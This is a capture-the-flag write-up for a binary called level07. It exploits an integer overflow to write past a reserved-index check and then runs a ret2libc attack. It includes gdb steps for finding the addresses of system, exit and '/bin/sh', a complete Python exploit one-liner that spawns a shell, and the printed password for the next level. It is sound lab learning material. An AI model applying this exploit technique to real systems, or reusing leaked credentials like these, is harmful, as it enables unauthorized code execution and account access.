Program behavior:
1. Erases arguments and enviroment variables;
2. Reads from stdin to a buffer (cmd) using `fgets` function;
3. On command "store": stores the number provided at the requested index. All indexes devisible by 3 are reserved;
4. On command "read": prints a number at the provided index;
5. On command "quit": terminates.

Solution:
Use integer overflow to store the payload at reserved index.

# Launch the debugger
gdb level07
# Disassemble main
disassemble main
`0x080488e3 <+448>:   lea    0x24(%esp),%eax`
`0x080488ea <+455>:   call   0x8048630 <store_number>`
# Set a breakpoint at store_number function
break *main + 455
# Start the program
run < <(python -c 'print("store")')
# Calculate the start index
print/d (($ebp + 4) - ($esp + 0x24)) / 4
`$1 = 114`
# Use integer overflow to bypass reversed check
print/u 0x100000000 / 4 + 114
`$2 = 1073741938`
# Get value of system function address
print/u &system
`$3 = 4159090384`
# Get value of exit function address
print/u &exit
`$4 = 4159040368`
# Get value of "/bin/sh" string address
info proc mappings
`0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so`
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
`0xf7f897ec`
print/u 0xf7f897ec
`$5 = 4160264172`
# Quit the debugger
quit
# Initiate ret2libc attack
(python -c 'print "store\n" + "4159090384\n" + "1073741938\n" + "store\n" + "4159040368\n" + "115\n" + "store\n" + "4160264172\n" + "116\n" +"quit\n"'; cat) | ./level07
# Check the flag
cat /home/users/level08/.pass
`7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`
